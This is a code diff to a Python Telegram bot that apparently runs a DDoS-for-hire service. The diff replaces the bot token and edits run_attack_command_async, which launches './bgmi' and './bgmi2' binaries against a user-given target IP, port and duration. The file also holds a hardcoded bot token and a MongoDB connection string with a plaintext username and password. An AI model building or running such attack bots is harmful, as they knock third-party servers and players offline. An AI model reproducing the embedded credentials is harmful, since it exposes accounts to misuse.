@@ -16,7 +16,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '6753975076:AAFPss-I9K4f9OwRj7eduvkapA8gx9AjKBY'
+TOKEN = '6921559672:AAFJYiSKXJ-K9ISEfMgqfqv7pylbTttsWfQ'
 MONGO_URI = 'mongodb+srv://botplays:botplays@botplays.0xflp.mongodb.net/?retryWrites=true&w=majority&appName=Botplays'
 FORWARD_CHANNEL_ID = -1002165028046
 CHANNEL_ID = -1002165028046
@@ -72,7 +72,7 @@ async def start_asyncio_loop():
 
 async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
     # Start the first binary command
-    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")
+    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} ")
     
     # Start the second binary command
     process2 = await asyncio.create_subprocess_shell(f"./bgmi2 {target_ip} {target_port} {duration} 100")
